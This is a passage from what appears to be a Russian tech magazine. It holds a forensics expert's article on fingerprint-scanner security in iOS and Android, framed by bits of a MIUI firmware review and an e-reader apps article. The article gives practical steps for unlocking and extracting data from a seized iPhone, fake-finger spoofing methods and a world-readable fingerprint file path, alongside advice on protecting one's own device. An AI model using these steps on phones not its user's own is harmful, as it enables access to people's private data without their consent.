   программы, как Pie Control, конечно, предоставляют больше функций и бо-
   лее удобны в использовании, но эта точка сделана классно, работает очень
   четко и прекрасно вписывается в интерфейс. К тому же переключение меж-
   ду классическим навбаром и плавающей точкой отлично продумано и рабо-
   тает без сбоев и перезагрузок.





     Режим для пожилых      Родительский контроль       Управление одной рукой

ПОЛЕЗНЫЕ ВСТРОЕННЫЕ ИНСТРУМЕНТЫ
Приятно, что в прошивку по умолчанию встроено множество полезных инстру-
ментов, — такое встретишь не в каждом ROM.
• Часы — стандартные часы Android с серьезно переработанным интерфей-
   сом.
• Погода — очень красивое, но явно слизанное с TouchWiz приложение пого-
   ды. Данные берутся с AccuWeather, доступен прогноз на четыре дня. Можно
   посмотреть скорость и направление ветра, давление, индекс ультрафиоле-
    та, температуру по ощущениям.
• Радио — обычное FM-радио. Работает, только если у тебя на девайсе
   есть поддержка радиоприемника. На Nexus 5 это приложение запускается,
   но не работает.
• Компас — включает в себя компас и уровень, показывает широту и долго-
    ту твоего местонахождения, давление в гигапаскалях, высоту над уровнем
   моря. Имеется поддержка работы с камерой. Позволит тебе ориентировать-
   ся на местности по сторонам света, всегда знать свои точные координаты,
   оценить крутизну склона горы, поставить по уровню стол, выставить палатку,
   повесить на стену картину. Однако в Play Market довольно легко найти этому
   инструменту замену с похожими возможностями.
• Заметки — клон Google Keep.
• Проводник — файловый менеджер. Поддерживает FTP, отображает исто-
  рию создания файлов, умеет сортировать файлы по категориям, обмени-
   ваться файлами с помощью Mi Drop. Очень напоминает ES Проводник с не-
   сколько урезанной функциональностью.
• Диктофон — простейшее приложение. Умеет только оставлять временные
   метки и ставить на паузу во время записи. В настройках есть выбор качества
   и возможность отключить все звуки во время записи.
• Почта — далеко не самое удобное, быстрое и функциональное почтовое
   приложение. Лучше сразу найти ему замену.
• Калькулятор — умеет отображать результат вычислений еще до нажатия
   кнопки =. Имеет встроенный конвертер валют, ипотеки, времени, объема
   и других величин. А вот его вряд ли кто-то захочет поменять.
• Сканер — комбайн, сочетающий в себе функции сканера штрих-кодов, ви-
   зиток и документов. Штрих-коды сканируются корректно и моментально,
   номера телефонов с визиток тоже, а вот сканер документов серьезно усту-
   пает в качестве сканирования бесплатному Office Lens.





              Облом :-(                   Заметки                 Секундомер


Разнообразие версий

В начале сентября 2016 года MIUI была доступ-
на для более чем 300 устройств. Но на практике
дела обстоят значительно хуже. На 04.09.2016
только 29 устройств имеют последнюю сбор-
ку прошивки версии 6.9.1, еще 19 девайсов —
версии  6.8.18–6.8.25 (возможно, они скоро
получат версию прошивки от  6.9.1). Причем
от номера версии прошивки не зависит версия
самого Android: к примеру, Xiaomi RedMi 1S TD,
Huawei Honor 3c Lite с MIUI 6.1.9 имеют Android
4.4, а Lenovo K30-W с тем же номером прошив-
ки получил Android 5.1.
  Номер прошивке дается не просто так: пер-                                                                     Погода
вая цифра — это год, вторая — месяц, третья —
день месяца. К примеру, номер 6.9.1 означает,
что прошивка собрана первого сентября 2016
года. Обновления на официальном сайте появ-
ляются каждую неделю в пятницу, однако собра-
ны они, как видно по номеру версии, не всегда
в четверг или пятницу. В основном обновления
содержат багфиксы и пару-тройку новых функ-
ций. К сожалению, никакой зависимости меж-
ду датой сборки и версией оболочки MIUI нет.
Выяснять версию оболочки для своего девайса
придется с помощью поисковика или официаль-
ного сайта. Ну и насколько мне известно, все
прошивки с Android 6.0 имеют MIUI v8.



ВЫВОД
                                                                     ТаймерПрошивка получилась весьма своеобразной. Это
контейнер, вобравший в себя функции, скопиро-
ванные у конкурентов. Я бы даже назвал ее шкатул-
кой. Она очень напоминает смесь TouchWiz и iOS, к которой добавили много
функций из CyanogenMod. Так что рекомендовать попробовать это творение
китайских мастеров могу тем, кто хочет кардинально обновить свой девайс,
или тем, кто безумно любит всякие красивые анимации и пестрое оформле-
ние с кучей украшалок. В этом создатели обошли многих конкурентов.
MOBILE
ПАЛЬЧИКИ



       СКАНЕР ОТПЕЧАТКА ПАЛЬЦА:ПРОКАТАЕМ?      БЕЗОПАСНОСТЬ И ОБХОД ЗАЩИТЫ





                                                                               Олег Афонин,
                                                                                        Эксперт по мобильной
                                                                                     криминалистике компании
                                                                                       Элкомсофт
                                                                                                  aoleg@voicecallcentral.com





Биометрические механизмы аутентификации используют-
ся в смартфонах не так давно. Всего три года назад дак-
тилоскопический сканер появился в iPhone 5s. Отдельные
попытки интегрировать сканеры отпечатков предпринима-
лись и раньше, но ничего хорошего из этого не выходило.
А как обстоят дела сегодня? Насколько легко обойти ска-
нер и надежно ли он хранит данные отпечатков пальцев?


КОЛИЧЕСТВО VS КАЧЕСТВО
Сегодня Apple ставит датчики Touch ID практически во все устройства (за ис-
ключением линейки iPod Touch), в то время как производители смартфонов
на Android получили возможность доступа к нужному API только с выходом
Android 6.0, под управлением которой сейчас работает порядка 15% устройств.
Попробуем разобраться, насколько безопасен дактилоскопический метод ау-
тентификации и имеет ли практический смысл его использование.
  Соблюдая исторический порядок, начнем мы, пожалуй, с Apple.





TOUCH ID И SECURE ENCLAVE: СЛАДКАЯ ПАРОЧКА
Три года назад проблемой Apple, уже в те времена начинавшей обращать
внимание на безопасность данных, было то, что пользователи в массе сво-
ей не желали каким-либо образом защищать собственные устройства. Вво-
дить PIN-код для разблокировки телефона? Это долго и неудобно. Посмотрев
на ситуацию, в Apple решили не заставлять людей использовать коды блоки-
ровки, а попросту максимально упростить процесс разблокировки. Основная
идея технологии Touch ID вовсе не в том, чтобы сделать безопаснее твой кон-
кретный аппарат. Идея в том, чтобы сделать безопасность достаточно удоб-
ной и привлекательной для основной массы пользователей. И своей цели ком-
пания добилась.
   Touch ID — это уникальный программно-аппаратный комплекс, и слово
«уникальный» здесь не несет рекламного оттенка: каждый датчик в процес-
се производства проходит настройку для работы с конкретным устройством.
Помнишь скандал с «ошибкой 53»? Именно эта особенность стала камнем
преткновения, который блокировал работу устройств с замененным в кустар-
ных условиях датчиком отпечатков пальцев.


                                                                  Сканер
                                                                      Touch ID
                                                                    в iPhone 5s





ГДЕ ХРАНЯТСЯ ОТПЕЧАТКИ ПАЛЬЦЕВ
Казалось бы, необходимость хранить данные отпечатков в виде односторон-
ней хеш-функции очевидна, но тебе это только кажется: разработчики HTC
One Max решили, что хранить отпечатки можно в виде картинок в самой обыч-
ной папке в памяти устройства. Чем бы ни думали разработчики HTC, инжене-
ры Apple такой ошибки не совершили: сканированный отпечаток пропускается
через хеш-функцию и сохраняется в Secure Enclave — защищенном от досту-
па извне микрокомпьютере. Отдельно отмечу, что эти данные не попадают
в iCloud и не передаются на сервер компании.
   Что интересно, даже односторонние хеш-функции отпечатков зашифро-
ваны, причем ключи шифрования вычисляются во время загрузки устройства
на основе уникального аппаратного ключа (который также хранится внутри
Secure Enclave и не может быть оттуда извлечен) и кода блокировки, который
вводит пользователь. Расшифрованные дактилоскопические данные хранят-
ся только в оперативной памяти устройства и никогда не сохраняются на диск.
При этом система время от времени удаляет данные отпечатков даже из опе-
ративной памяти устройства, вынуждая пользователя авторизоваться с помо-
щью кода блокировки (который, напомним, даст системе возможность рас-
шифровать данные отпечатков и возобновить работу датчика Touch ID).

КОГДА И ПОЧЕМУ IOS УДАЛЯЕТ ДАННЫЕ ОТПЕЧАТКОВ
ИЗ ОПЕРАТИВНОЙ ПАМЯТИ
Пожалуй, самое интересное в системе безопасности iOS — это именно во-
прос о том, при каких обстоятельствах iOS удалит данные отпечатков из опе-
ративной памяти устройства и заставит пользователя заново авторизоваться
с помощью кода разблокировки. Но для начала подумаем, зачем Apple вооб-
ще понадобилось периодически удалять отпечатки?
  В компании отлично понимают (и понимали три года назад), что любую
биометрическую систему можно обмануть. Да, в Apple разработали пре-
красные дактилоскопические сканеры, обойти которые далеко не так просто,
как датчик, к примеру, Samsung Galaxy S5. Но при этом все-таки можно. В кон-
це концов, владельца можно заставить приложить палец для разблокирования
телефона — вот только в рамках американской правовой системы для этого
требуется ордер, на получение которого уходит время... по истечении которо-
го телефон удалит из памяти данные отпечатков и не позволит разблокировать
устройство по отпечатку пальца.
   Звучит как натяжка? Попахивает теорией заговора? Нет, просто Apple
очень не понравилась попытка давления со стороны правоохранительных ор-
ганов, в ответ на которое она и ввела эту меру: Apple adds another rule forcing
iPhone and iPad users to employ a passcode to unlock their device.
  Но не будем отвлекаться, а посмотрим внимательно на условия, при кото-
рых система блокирует работу Touch ID и вынуждает авторизоваться с помо-
щью кода блокировки. Датчик Touch ID выключается, а данные отпечатков уда-
ляются из памяти устройства при соблюдении любого из следующих условий:
•  телефон выключен или перезагружен;
•  пользователь добавляет данные еще одного пальца;
•  телефон получает команду удаленной блокировки через Find My iPhone;
•  было пять безуспешных попыток разблокирования с помощью отпечатка
   подряд;
•  устройство ни разу не разблокировалось в течение двух суток;
•  антиполицай: прошло более шести суток с момента последнего ввода кода
   блокировки, а само устройство не было разблокировано датчиком Touch ID
   в течение последних восьми часов.

Смысл последнего пункта нужно пояснить. По мнению сайта PhoneArena, он
«может усложнить работу правоохранительных органов». Я выразился бы бо-
лее уверенно, ведь последний пункт был введен сразу после нашумевше-
го процесса с террористом из Сан-Бернардино, когда на Apple оказывалось
беспрецедентное давление.

КАК ОБОЙТИ
Если речь идет о взломе Touch ID, то обмануть датчик сложно, но можно.
Для обмана современных датчиков тебе придется создать трехмерную модель
пальца, причем из правильного материала. На старых устройствах (iPhone 5s,
iPad mini 3) обойти датчик заметно проще. К примеру, команда немецких хаке-
ров смогла провести датчик iPhone 5s через два дня после выхода устройства
на рынок, попросту распечатав оригинальный отпечаток пальца с разрешени-
ем 2400 dpi.
  Но перед тем, как приступать к моделированию отпечатка, тебе необхо-
димо позаботиться о сохранности данных на устройстве, а также о том, чтобы
данные отпечатка не успели «протухнуть».
   Действовать нужно четко и быстро: у тебя минимум времени.
1. Итак, к тебе в руки попал телефон в неизвестном состоянии. Не трогай кноп-
   ку Touch ID! Если телефон заблокирован (а он, скорее всего, заблокирован),
   ты напрасно потратишь одну попытку из пяти. Проверь состояние устрой-
   ства коротким нажатием кнопки питания.
2. Если устройство заблокировано, изолируй его от внешних радиосетей, по-
   местив его в клетку Фарадея (в домашних условиях ее роль выполнит обыч-
   ная микроволновка. Выключенная микроволновка!). Не забудь поставить
   его на зарядку, даже если ее роль будет выполнять внешний аккумулятор.
  Все это делается для того, чтобы оградить устройство от команд по про-
   токолу Find My iPhone, которые позволят как дистанционно заблокировать
   устройство, так и уничтожить его содержимое. (Думаешь, эти меры очевид-
   ны? Как бы не так! Науке известны как минимум два нашумевших случая,
   когда полицейские допускали удаленное уничтожение данных с уже конфи-
   скованных устройств.)
3. А вот если устройство разблокировано, в твоих силах не позволить ему за-
   блокировать экран. Для этого просто отключи автоматическую блокировку
   (в отличие от процедуры снятия кода блокировки, для отключения автомати-
   ческой блокировки никакой код тебе вводить не потребуется).
4. Если устройство было заблокировано, у тебя есть максимум 48 часов (на
  самом деле меньше) на попытки обмануть датчик отпечатков.
5. Обрати внимание: все манипуляции с устройством должны проводиться ис-
   ключительно в среде, защищенной от радиоволн (сетей Wi-Fi и сотовых се-
   тей). Для срабатывания Find My iPhone достаточно пары секунд.
6. Если датчик отпечатков удалось обмануть, отключи автоматическую блоки-
   ровку экрана (см. пункт 3). Имей в виду: попытки добавить еще один отпеча-
   ток в настройках или сменить код блокировки не пройдут — для этих опера-
   ций система всегда потребует ввести код.

КАК ЭТО ИСПОЛЬЗОВАТЬ?
Допустим, у тебя получилось обмануть датчик отпечатка пальцев. Что дальше?
iOS — закрытая система, а вся память устройства будет зашифрована. Вари-
анты?
•  Установка джейлбрейка: нет. Для взлома 64-битного iPhone или iPad тебе
   в любом случае потребуется ввести код блокировки (а в некоторых случаях
  еще и отключить код блокировки в настройках).
•  Физическое извлечение данных: можно попробовать. Если джейлбрейк уже
   установлен, ты сможешь извлечь большую часть данных, но не сможешь
   расшифровать keychain. А вот если джейлбрейка нет, то ничего поделать
   не получится — для его установки тебе потребуется код блокировки.
•  iCloud: возможно. Разблокировав устройство, ты сможешь заставить его
   сохранить свежую резервную копию в iCloud (Settings    iCloud   Backup
     Backup now). Помни, однако, что для извлечения этих данных из облака
   тебе понадобится пароль от Apple ID, а если в учетке активирована двухфак-
   торная аутентификация — то и доступ ко второму фактору (в роли которого,
   впрочем, может выступить исследуемое устройство). Важный момент: тебе
   придется подключить устройство к Wi-Fi, в результате чего вместо резерв-
   ной копии на устройство может прилететь команда блокировки или уничто-
   жения данных.
•  Резервная копия iTunes: пожалуй, это единственное, что сделать можно
   и нужно. Разблокированное устройство легко подключается к iTunes, с по-
  мощью которого создается резервная копия данных на твоем компьютере.
  Дальнейшее — дело техники. Один момент: пароль на резервную копию.
   Если он установлен, тебе придется его взломать (например, с помощью
   Elcomsoft Phone Breaker). А вот если он не установлен — обязательно уста-
   нови свой! Простейшего 123 будет вполне достаточно. Из резервной копии,
   зашифрованной паролем, ты сможешь извлечь все данные, а из незашиф-
   рованной — все, кроме keychain. Поскольку в keychain хранится все самое
   интересное, установить временный пароль перед снятием резервной копии
   будет весьма полезно.

ИТОГ
В Apple смогли с первой же попытки создать завершенную и очень удачную
схему защиты. Датчик отпечатков удачно вписался в общую концепцию. Про-
граммным способом обойти эту защиту невозможно, времени на любые по-
пытки обмануть датчик у хакера совсем немного, а результат на новых устрой-
ствах не гарантирован. Однозначно — в компании добились своей цели.





ОТПЕЧАТКИ ПАЛЬЦЕВ И ANDROID
Перейдем к исследованию дактилоскопической аутентификации в устройствах
под управлением Android. Разобрав очень удачную реализацию от Apple, по-
смотрим внимательно на состояние дел в лагере конкурентов.

GOOGLE ANDROID 4.X–5.1.1: ВСЕ ОЧЕНЬ ГРУСТНО
Первые устройства со встроенными дактилоскопическими датчиками ста-
ли появляться довольно давно, еще во времена Android 4.4. На сегодняшний
день их уже очень много: это Samsung Galaxy S5, S6, S7, Motorola Moto Z, Sony
Xperia Z5, LG G5, Huawei Ascend Mate 7 и последующие, Meizu Pro 5 — и это
далеко не все. Вот только не в каждом устройстве датчик отпечатков исполь-
зуется правильным образом. Связано это в первую очередь с тем, что вплоть
до версии Android 6.0 в системе не существовало универсального API для дак-
тилоскопической аутентификации. Нет API — нет и формальных требований
Compatibility Definition, и, соответственно, нет никакой сертификации со сторо-
ны Google.
  При полном отсутствии внешнего контроля производители нагородили та-
кое... в страшном сне не приснится. Например, разработчики HTC One Max
экстерном сдали экзамен по курсу «Android за 21 день» и реализовали заме-
чательную систему, которая хранит полноценные копии отпечатков пальцев
в публично доступном каталоге в несжатом (не говоря уже о шифровании)
формате. Пожалуй, в инструкциях по «взлому» этой системы нет никакой нуж-
ды. Уточню только, что данные хранятся в файле /data/dbgraw.bmp, причем
для твоего удобства разрешение доступа выставлено 0666.





                                                           HTC One Max





Пример не единичный. Samsung Galaxy S5 вышел с Android 4.4 на борту. В ско-
ром времени хакерам удалось получить доступ к сканеру отпечатков и успеш-
но обойти защиту.
  До выхода шестой версии Android производители успели выпустить массу
устройств, к которым безграмотно прикрутили датчики отпечатков. Ломать их
даже неинтересно, до того там все уныло. Понятно, что долго терпеть такую
ситуацию в Google не могли. Они и не стали.

ANDROID 6.0: FINGERPRINT API И NEXUS IMPRINT
С выходом Android 6.0 в Google не только разработали собственный API для ау-
тентификации по отпечаткам пальцев, но и обновили Compatibility Definition
Document, которому обязаны следовать все производители, желающие сер-
тифицировать свои устройства для установки сервисов Google (это очень важ-
ный момент, о нем чуть позже).
  Было выпущено сразу два референсных устройства: Nexus 5X и Nexus 6P.
В них — и неотключаемое шифрование раздела данных, и правильная реали-
зация датчиков отпечатков, получившая название Nexus Imprint.





                                        Настройка сканера отпечатков в Nexus 6P

Итак, чего же требует Google от производителей для получения сертификата
соответствия? В отличие от ситуации с обязательным шифрованием на Android
5.0, на сей раз список требований не допускает двойных толкований. Переве-
дем выдержку из официального документа (pdf).

7.3.10. Датчик отпечатков пальцев
В устройствах, в которых возможно использование блокировки экрана, РЕ-
КОМЕНДУЕТСЯ использование датчика отпечатков  пальцев. Требования
к устройствам, оборудованным таким датчиком и предоставляющим доступ
к API сторонним разработчикам:
• ОБЯЗАТЕЛЬНО декларировать поддержку android.hardware.fingerprint.
• ОБЯЗАТЕЛЬНО полная реализация fingerprint API из документации к Android
  SDK [Resources, 95].
• ОБЯЗАТЕЛЬНО иметь уровень ложноположительных срабатываний менее
   0,002%.
• НАСТОЙЧИВО РЕКОМЕНДУЕТСЯ уровень ложноотрицательных срабаты-
   ваний менее 10%, задержка срабатывания менее 1 секунды (для 1 сохра-
   ненного отпечатка).
• ОБЯЗАТЕЛЬНО ограничивать скорость попыток 30-секундной задержкой
   после 5 неудачных попыток.
• ОБЯЗАТЕЛЬНО иметь аппаратное безопасное хранилище, а верификацию
   отпечатков проводить исключительно в доверенной зоне Trusted Execution
   Environment (TEE) или на выделенном процессоре с безопасным каналом
   связи с TEE (на этом погорел Samsung S5, в котором с безопасным каналом
   связи была проблема).
• ОБЯЗАТЕЛЬНО шифровать данные отпечатков таким образом, чтобы доступ
   к ним невозможно было получить за пределами Trusted Execution Environment
   (TEE) согласно Android Open Source Project [Resources, 96].
• ОБЯЗАТЕЛЬНО не разрешать добавлять отпечатки без установления дове-
   ренной цепочки (пользователь должен добавить или верифицировать PIN/
   паттерн/пароль через TEE согласно Android Open Source).
• НЕ ПОЗВОЛЯТЬ сторонним приложениям различать отдельные отпечатки.
• ОБЯЗАТЕЛЬНО  корректно  обрабатывать  флаг  DevicePolicyManager.
   KEYGUARD_DISABLE_FINGERPRINT.
• ВСЕ ОПИСАННЫЕ ВЫШЕ ТРЕБОВАНИЯ ОБЯЗАТЕЛЬНЫ при обновлении
   до Android 6.0, при этом данные отпечатков должны быть или мигрированы
   безопасным образом, или сброшены.
• ЖЕЛАТЕЛЬНО использовать иконку Android Fingerprint из Android Open
   Source Project.

Как видим, документ не подразумевает двойных толкований. Производители, же-
лающие сертифицировать устройства на базе Android 6.0 и выше, оборудованные
датчиками отпечатков, должны полностью выполнить все требования. Более того:
устройства, которые обновляются на Android 6.0, также обязаны соответствовать
новым требованиям (и, соответственно, проходить сертификацию).
  В другой части документа приведено требование обязательно включать
шифрование при использовании безопасной блокировки экрана (в том числе
датчика отпечатков пальцев). Как видим, в теории дела обстоят неплохо. А что
на самом деле?





                                                            Сканер отпечатка
                                                               в Nexus 5X



ANDROID SMART LOCK
А на самом деле в Android до сих пор есть ряд зияющих дыр в безопасности,
позволяющих не просто обходить, а обходить на раз плюнуть все эти отпе-
чатки и пароли. Одна из таких дыр — система Android Smart Lock, с помощью
которой можно автоматически разблокировать телефон при совпадении не-
которых внешних факторов. К примеру, многие пользователи разрешают ав-
томатическую разблокировку дома, забывая о том, что точность позициони-
рования далеко не идеальна и понятие «дом» для телефона будет охватывать
80-метровый радиус. Многие активируют разблокировку доверенным устрой-
ством Bluetooth или включают псевдобиометрическую разблокировку по сним-
ку лица (обходится довольно легко демонстрацией видеоролика или трехмер-
ной модели).
   Что интересно, никакой необходимости в Smart Lock при наличии работо-
способного датчика отпечатков нет: экран в любом случае включается и раз-
блокируется нажатием одной кнопки. Почему в Compatibility Definition нет тре-
бования отключать Smart Lock при активном датчике отпечатков? Загадка.
Но ты можешь использовать эту систему для разблокирования устройства.
Только имей в виду, что Smart Lock не будет активна сразу после перезагрузки
устройства; для активации системы устройство нужно будет разблокировать
паролем или паттерном хотя бы раз.

НАШИ КИТАЙСКИЕ ДРУЗЬЯ
А как обстоят дела в многочисленных китайских телефонах, которые тоже идут
с датчиками отпечатков? Там все очень по-разному.
  Выше мы  говорили  о  требованиях  Google,  изложенных  в  Android
Compatibility Document. Если производитель хочет сертифицировать свои
устройства для установки на них сервисов Google, его устройство под управ-
лением конкретной версии прошивки должно пройти сертификацию в одной
из лабораторий.
  В Китае Google под запретом, и многие полуподвальные производите-
ли совершенно не собираются заморачиваться с ненужными сертификация-
ми. Да ты и сам знаешь, с какими прошивками зачастую приходят устройства
из Китая. В угоду производительности шифрование, как правило, не включает-
ся даже в прошивках на основе Android 6.0, а загрузчик не блокируется прин-
ципиально (в случае с процессорами MediaTek) или может быть легко раз-
блокирован. Соответственно, есть там датчик отпечатков или нет — не играет
ни малейшей роли.
  Даже если шифрование будет включено пользователем (маловероятно
в случае дешевых устройств, но все же), у пользователя нет никакой гарантии,
что датчик отпечатков интегрирован правильным образом. Особенно это ка-
сается устройств, которые продавались с Android 5 и более ранними версия-
ми на борту, а обновление до 6-й версии Android получили позднее.
  Из этого правила бывают исключения. Все международные модели Huawei,
Lenovo в обязательном порядке сертифицируются Google (а вот о специфиче-
ски китайских моделях этого сказать нельзя). Интересна ситуация со смартфо-
нами LeEco, которые продаются в Китае и пытаются завоевать внешние рын-
ки. В случае с LeEco для одной и той же модели часто существуют как чисто
китайские, так и международные прошивки. Отличаются они далеко не только
предустановленным магазином Google Play, списком доступных языков и нали-
чием/отсутствием «китайского мусора». В случае с международными прошив-
ками (Индия, США, Россия) компания формально сертифицирует устройство
для установки Google Play Services. В частности, в международных прошивках
LeEco на основе Android 6.0 (например, для Le2 Max) активируется (и не от-
ключается) шифрование раздела данных — в полном соответствии с требова-
ниями Android Compatibility Document. Многими пользователями это воспри-
нимается как неудобство, и они пытаются перейти с таких прошивок на что-то
другое, основанное на китайских сборках, что в свете разблокированного за-
грузчика полностью обесценивает всю модель безопасности.

КАК ВЗЛОМАТЬ
Взлом датчика отпечатков для Android подразумевает имитацию пальца, с по-
мощью которого можно разблокировать смартфон. Насколько подробной и ка-
чественной должна быть имитация, из какого материала выполнена — зависит
от технологии, на которой построен датчик конкретной модели смартфона.
   Так, ультразвуковые датчики бесполезно пытаться обмануть с помощью от-
печатка, распечатанного с высоким разрешением на специальной токопрово-
дящей бумаге, — но стандартные емкостные сканеры таким образом перехи-
трить можно.
  А вот ультразвуковой датчик обманывается
с помощью пальца, отпечатанного на 3D-прин-
тере,  причем  материал  особого  значения
не имеет. Наконец, практически любой датчик
примет за настоящий накладной отпечаток, вы-
полненный из тонкого слоя токопроводящего
материала и надетый поверх пальца.
   Наверное, о том, что для разблокирова-
ния телефона, оборудованного дактилоскопи-
ческим датчиком, можно использовать палец
спящего, бессознательного человека или даже
трупа (полиция пользуется этим способом по-
стоянно), упоминать нет необходимости.
  А вот о том, что в некоторых странах пра-                                                 Накладной отпечаток пальца
вительства собирают базы данных отпечат-
ков пальцев своих и не только своих граждан
(когда-нибудь получал американскую визу?),
упомянуть необходимо. И если сейчас законодательные ограничения не по-
зволяют использовать эти базы для разблокирования телефонов просто
по подозрению, то в будущем я такой гарантии не дам.

СРАВНЕНИЕ С TOUCH ID
Напрямую сравнить безопасность Apple Touch ID с ситуацией в мире Android
не получится: если у Apple устройств единицы, то смартфонов на Android, на-
оборот, слишком много. В них могут использоваться самые разные датчики,
основанные на разнообразных технологиях (от емкостных и оптических до уль-
тразвуковых). Для разных датчиков подбирают разные технологии обхода.
К примеру, для Samsung Galaxy S6 вполне срабатывает финт с разблокиро-
ванием телефона моделью пальца, напечатанной на 3D-принтере из самого
обычного пластика (с Apple Touch ID такой простой трюк не пройдет; для пе-
чати нужно будет использовать материал, обладающий особыми свойствами).
Некоторые другие устройства легко обманываются распечатанными с высо-
ким разрешением картинками.
  А вот сравнение с Nexus Imprint вполне имеет смысл. В Nexus 5X и 6P
Google использовал образцово-показательный подход к безопасности. Это
и неотключаемое шифрование раздела данных, и грамотная интеграция дат-
чиков отпечатков, да и сами датчики выбраны не абы как.
  В устройствах сторонних производителей могут использоваться недоста-
точно безопасные датчики, могут зиять откровенные дыры в безопасности
(несмотря на формальное соответствие требованиям Android Compatibility
Definition). Приведем подробную таблицу.


     Apple iOS Touch ID           Android 4.4–5.1.1            Android 6.0 – 7.0

  При включении и переза-   Полная свобода выбора.     Нет формальных тре-
  грузке устройства обяза-    Большинство произво-       бований. Производи-
  тельно разблокирование    дителей давало возмож-     тели до сих пор имеют
  паролем                   ность разблокировать       возможность разбло-
                             устройство отпечатком       кировать устройства от-
                             сразу после перезагрузки.    печатком сразу после
                                                          перезагрузки, но боль-
                                                   шинство так не поступает.

  Touch ID протухает через    Как правило, возмож-      Нет формальных тре-
  48 часов (или через 8 ча-    ность разблокировки       бований. Nexus Imprint
  сов, если пароль послед-    отпечатком сохраняется    периодически требует
  ний раз вводился более    до бесконечности.         ввода пароля, но соот-
  6 дней назад)                                      ветствующие требования
                                                               к сторонним производи-
                                                    телям не озвучены.

  Добавление нового от-     Полная свобода. В неко-    Аналогично Touch ID.
  печатка требует обяза-      торых устройствах новый
  тельной парольной ау-      отпечаток можно доба-
  тентификации.              вить без аутентификации.

  Аппаратное безопас-      Полная свобода. Можно    Аппаратное безопас-
  ное хранилище (Secure      хранить отпечатки в виде    ное хранилище (Trusted
  Enclave)                   картинок в публичном       Execution Environment)
                              доступе.                  обязательно для всех
                                                        устройств с Android 6.0,
                                                     включая обновившиеся
                                                 до Android 6.0 устройства

  Доступ к отпечаткам не-    Нет защиты (HTC One       Root недостаточно для
  возможен даже после      Max X) или защита не-       доступа к отпечаткам.
  jailbreak                   достаточна (Samsung       Существуют уязвимости
                              Galaxy S5)                 низкого уровня, позволя-
                                          ющие такой доступ полу-
                                                               чить.

  Каждый датчик Touch ID     Сенсор можно заменить    Нет формальных требо-
  проходит индивидуаль-     на любой совместимый.     ваний. В большинстве
  ную настройку для ра-                                  устройств замена датчи-
  боты с конкретным                                     ка не приводит к пробле-
  устройством. Сторонние                             мам, сохранённые отпе-
  датчики блокируются                                    чатки не удаляются.
  (постоянно требуется
  парольная аутентифика-
  ция).

  Touch ID второго поко-    В некоторых устройствах    Датчики в Nexus 5x и 6p
  ления (устанавливает-      датчики работают терпи-    отличаются идеальной
  ся в iPhone 6s, 6s Plus       мо, в некоторых – бес-      работой. У сторонних
  и 7/7Plus) срабатывает     полезны чуть более чем     производителей встре-
  мгновенно с абсолютным    полностью.                чаются как отличные, так
  минимумом ложных сра-                            и очень плохие датчики.
  батываний.


КАК ЗАЩИТИТЬСЯ
Прочитал статью и твердо решил отключить злосчастный датчик в своем
устройстве, использовав вместо него сложный буквенно-цифровой пароль?
Не спеши. На самом деле все не так плохо. В случае с относительно современ-
ными устройствами Apple (начиная с iPhone 6, iPad mini 4, iPad Air) взлом дак-
тилоскопического датчика тебе не грозит: даже если твой отпечаток сумеют
отсканировать в достаточно высоком разрешении, времени на то, чтобы его
использовать, у злоумышленника будет совсем немного. Правоохранительные
органы могут заставить тебя разблокировать телефон отпечатком (и в отличие
от разблокировки паролем они имеют на это полное право), но для этого дей-
ствия им потребуется получить специальный ордер, в котором будет оговоре-
на вся процедура. На получение ордера нужно время, за которое данные от-
печатка в твоем iPhone успеют «протухнуть».
  А вот если у тебя смартфон на Android... Включи шифрование. Без него
данные с твоего телефона сольют безо всяких датчиков. Отключи Smart
Lock — это зияющая дыра в безопасности. Убедись, что твой аппарат серти-
фицирован Google и работает под управлением Android 6.0 или более новой
системы. Если это не так — я бы датчик отключил от греха подальше. Наконец,
не поленись поискать информацию о том, был ли взломан датчик отпечатков
для твоего устройства и если был — просто или сложно это сделать. Прини-
май решение в зависимости от того, насколько лично тебя устраивает слож-
ность взлома дактилоскопического датчика потенциальным злоумышленником
именно на твоем устройстве.

ЗАКЛЮЧЕНИЕ
Дактилоскопическая аутентификация — не панацея. Ее основное предназна-
чение не в том, чтобы сделать более безопасным конкретно твое устройство,
а в том, чтобы снизить неудобства, связанные с безопасной блокировкой теле-
фона, и таким образом убедить основную массу пользователей все-таки бло-
кировать свои устройства. У Apple — получилось. В Android ситуация сложнее:
референсная система Nexus Imprint работает идеально,
практически полностью копируя методы Touch ID. У других      Почитать
производителей дела обстоят не так радужно. Качество
                                                                          Google Nexus 6P securityи безопасность датчиков временами вызывают сомнения,
                                                                                           features examined
а в устройствах под управлением Android 5.1 и более ран-
них версий дактилоскопические датчики и вовсе остают-    Android 6.0 APIs: Finger-
ся открытой дырой в безопасности. В случае с китайскими       print Authentication
устройствами с разблокированным загрузчиком наличие
                                                              How fingerprint scannersдактилоскопического датчика никак не ухудшит и без того                                                                                  work: optical, capacitive,
отсутствующую безопасность (впрочем, может и ухуд-                                                                         and ultrasonic variants
шить: если попавший в твои руки телефон включен, а раз-           explained
дел данных зашифрован, то обман такого датчика — от-
личный способ обойти шифрование).
MOBILE
БИБЛИОТЕКА
В КАРМАНЕЧИТАЕМ КНИГИ, ДОКУМЕНТЫ
И СТАТЬИ С КОМФОРТОМ





   Денис Погребной
    denis2371@gmail.com





Планшеты и смартфоны уже давно превратились в пол-
ноценную замену электронных книг. Мы используем их
для чтения почты и твиттера, новостных сайтов, книг и до-
кументации. Казалось бы, здесь и так все понятно и нече-
го пояснять, но на самом деле существует масса нюансов
и лайфхаков, которые сделают чтение текста на мобильном
девайсе гораздо более приятным и удобным занятием.

КНИГИ
Начнем, конечно же, с книг. Для чтения книг на Android существует великое
множество различных программ. Но для нашего комфорта они должны удов-
летворять некоторым требованиям: понимать как минимум форматы FB2
и EPUB (самые распространенные), уметь корректно переносить слова на рус-
ском языке, уметь синхронизировать позицию чтения через интернет (начал
читать на планшете — продолжил на смартфоне), уметь отображать книгу в две
страницы (как реальную открытую книгу). Ну и набор фонов на любой вкус тоже
немаловажный признак.
   Таким требованиям удовлетворяют три лучшие читалки в маркете:
•  PocketBook. Радует поддержкой большого количества форматов: PDF
   (Adobe DRM), DOCX, DjVu, RTF, TXT, FB2, EPUB (Adobe DRM), FB2.zip, CHM,
   HTML (basic), CBZ, CBR, СBT. Так что с помощью PocketBook можно не толь-
   ко книжки читать, но еще и комиксы и документы. Интерфейс красивый и ка-
   чественно проработанный, настроек много, есть поддержка переформати-
   рования PDF для более удобного чтения. Существенных недостатков только
    три: отсутствие поддержки формата DOC (некоторые книги можно найти
